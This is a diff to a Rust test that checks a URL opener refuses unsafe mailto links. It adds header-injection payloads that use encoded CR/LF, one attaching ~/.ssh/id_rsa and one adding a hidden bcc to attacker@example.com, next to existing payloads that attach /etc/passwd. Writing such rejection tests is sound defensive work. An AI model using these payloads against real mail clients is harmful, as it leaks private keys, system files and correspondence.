@@ -689,6 +689,13 @@ fn open_url_refuses_mailto_fields_that_are_not_plainly_safe() {
         // finite list of these, which is the whole argument for an allowlist.
         "mailto:attacker@example.com?x-mozilla-attach=/etc/passwd",
         "mailto:attacker@example.com?attachurl=file:///etc/passwd",
+        // Allowlisting the *name* is only half of it. RFC 6068 §7 warns
+        // that a client writing hfvalues into headers without sanitizing
+        // can be made to emit fields the URL never listed, so a decoded CR
+        // or LF inside a permitted field smuggles one in behind it — the
+        // encoded-value twin of the encoded-name hole above.
+        "mailto:victim@example.com?subject=Hi%0D%0Aattach=/Users/u/.ssh/id_rsa",
+        "mailto:victim@example.com?body=hello%0Abcc=attacker@example.com",
     ] {
         let stream = format!(
             r#"[
